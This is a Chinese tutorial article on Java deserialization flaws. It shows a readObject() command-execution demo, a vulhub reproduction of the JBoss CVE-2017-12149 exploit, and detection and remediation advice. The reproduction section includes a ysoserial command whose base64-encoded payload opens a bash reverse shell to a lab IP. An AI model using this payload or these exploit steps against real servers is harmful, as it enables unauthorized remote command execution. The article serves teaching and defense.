> 原文链接: https://www.anquanke.com//post/id/251223 


# 说说JAVA反序列化


                                阅读量   
                                **32925**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01ac73b782bb788959.jpg)](https://p3.ssl.qhimg.com/t01ac73b782bb788959.jpg)



JAVA 是我国开发者广泛使用的开发语言，在金融行业使用尤为突出。实战中，利用 Java 反序列化实现远程命令执行的案例增长趋势明显，同时，WebLogic、 WebSphere、 JBoss、 Shiro等框架也都先后受到反序列化漏洞的影响，不安全的反序列化漏洞也已被列入OWASP Top 10（2021）。



## 0x01 关于JAVA序列化和反序列化

序列化是把对象转换为字节序列的过程，反序列化是把字节序列恢复为对象的过程。JAVA 序列化和反序列化主要解决了两个问题：1、把对象的字节序列永久地保存到硬盘或数据库中，实现对象的持久化存储；2、通过网络上传送对象的字节序列实现 JAVA 对象实例的网络传输。

[![](https://p4.ssl.qhimg.com/t01fcd8e99d9bfddc38.jpg)](https://p4.ssl.qhimg.com/t01fcd8e99d9bfddc38.jpg)

序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。

由于 JAVA生态的原因，开发者会引用大量开源组件和第三方组件，JAVA标准库及大量第三方公共类库成为反序列化漏洞利用的关键。安全研究人员已经发现大量利用反序列化漏洞执行任意代码的方法，最让大家熟悉的是Gabriel Lawrence和Chris Frohoff在《Marshalling Pickles how deserializing objects can ruin your day》中提出的利用Apache Commons Collection第三方公共类库实现任意代码执行。

JAVA 常见的序列化和反序列化的方法有JAVA 原生序列化和 JSON 类（fastjson、jackson）序列化。本文对JAVA原生反序列化进行讨论，JSON类序列化后续将介绍。



## 0x02 JAVA反序列化漏洞原理

如果JAVA应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。举个例子，我们自己写了一个 class 来进行对象的序列与反序列化。

```
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.text.MessageFormat;
import java.io.Serializable;
public class test`{`
    public static void main(String args[]) throws Exception`{`
        MyObject myObj = new MyObject();
        myObj.name = "hi";
        FileOutputStream fos = new FileOutputStream("object");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(myObj);
        os.close();
        FileInputStream fis = new FileInputStream("object");
        ObjectInputStream ois = new ObjectInputStream(fis);
        MyObject objectFromDisk = (MyObject)ois.readObject();
        System.out.println(objectFromDisk.name);
        ois.close();
    `}`
`}`
class MyObject implements Serializable`{`
    public String name;
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException`{`
        in.defaultReadObject();
        Runtime.getRuntime().exec("C:/Windows/System32/cmd.exe /c calc");
    `}`
`}`
```

MyObject 类有一个公有属性 name ，myObj 实例化后将 myObj.name 赋值为了 “hi” ，然后序列化写入文件 object，然后读取 object 反序列化时，按照readObject()函数，执行了系统命令，弹出了计算器。

[![](https://p4.ssl.qhimg.com/t01d8f4cb6916cc6db1.jpg)](https://p4.ssl.qhimg.com/t01d8f4cb6916cc6db1.jpg)

MyObject 类实现了Serializable接口，并且重写了readObject()函数，只有实现了Serializable接口的类的对象才可以被序列化，没有实现此接口的类将不能使它们的任一状态被序列化或逆序列化。这里的 readObject() 方法的作用是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回，readObject() 是可以重写的，因此可以定制反序列化的一些行为，进而可以用来进行漏洞利用，比如这里的命令执行。



## 0x03 JBoss 反序列化漏洞复现

WebLogic、WebSphere、JBoss、Shiro等框架都出现过反序列化问题，这里以JBoss5.x/6.x 反序列化漏洞为代表，复现java反序列化漏洞利用过程。JBoss 5.x/6.x 反序列化漏洞存在于http invoker 组件的 ReadOnlyAccessFilter 的 doFilter 中。如下图所示：

[![](https://p5.ssl.qhimg.com/t01877e730bd0d75102.jpg)](https://p5.ssl.qhimg.com/t01877e730bd0d75102.jpg)

这里doFilter方法中的代码在没有进行任何安全检查的情况下，将来自客户端的数据流（request.getInputStream()）进行了反序列化操作（红色箭头所示），从而导致了反序列化漏洞。漏洞复现实验环境：vulhub，[https://vulhub.org/#/environments/jboss/CVE-2017-12149/](https://vulhub.org/#/environments/jboss/CVE-2017-12149/) 启动docker环境，进入到漏洞环境，编译启动漏洞环境：

[![](https://p3.ssl.qhimg.com/t01df623aa08e2be6be.jpg)](https://p3.ssl.qhimg.com/t01df623aa08e2be6be.jpg)

我们使用bash来反弹shell，但由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法，我们需要用进行一次编码。工具：[http://www.jackson-t.ca/runtime-exec-payloads.html](http://www.jackson-t.ca/runtime-exec-payloads.html)

[![](https://p3.ssl.qhimg.com/t01c68309172e006e80.jpg)](https://p3.ssl.qhimg.com/t01c68309172e006e80.jpg)

使用ysoserial来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：

```
java -jarysoserial.jar CommonsCollections5 "bash -c`{`echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjEvMTIzNDUgMD4mMQ==`}`|`{`base64,-d`}`|`{`bash,-i`}`"&gt; poc.ser
```

生成好的POC即为poc.ser，将这个文件作为POST的Body发送至/invoker/readonly即可：

[![](https://p2.ssl.qhimg.com/t019d6d0556665d8455.jpg)](https://p2.ssl.qhimg.com/t019d6d0556665d8455.jpg)

JBOSS反序列化漏洞利用成功，成功反弹shell：

[![](https://p1.ssl.qhimg.com/t01fc2ba0e928b11c83.jpg)](https://p1.ssl.qhimg.com/t01fc2ba0e928b11c83.jpg)



## 0x04 漏洞发现与修复

JAVA反序列化漏洞发现包括白盒和黑盒两种方式，对于白盒方式主要依靠代码审计，以ObjectInputStream.readObject()为例，其它反序列化接口的检测原理也相似，可通过实现解析java源代码，检测readObject()方法调用时判断其对象是否为java.io.ObjectOutputStream。如果此时ObjectInputStream对象的初始化参数来自外部请求输入参数则基本可以确定存在反序列化漏洞。

而对于黑盒的方式，JAVA序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB，对于这种流量特征的入口，可调用ysoserial并依次生成各个第三方库的利用payload，构造为访问特定url链接的payload，根据http访问请求记录判断反序列化漏洞是否利用成功。



## 常见的修复手段包括：

1、类白名单校验，在 ObjectInputStream 中 resolveClass 里只是进行了 class 是否能被 load ，自定义 ObjectInputStream , 重载 resolveClass 的方法，对 className 进行白名单校验。<br>
2、禁止 JVM 执行外部命令 Runtime.exec，通过扩展 SecurityManager 可以实现。<br>
3、根据实际情况，需要及时更新commons-collections、commons-io等第三方库版本。
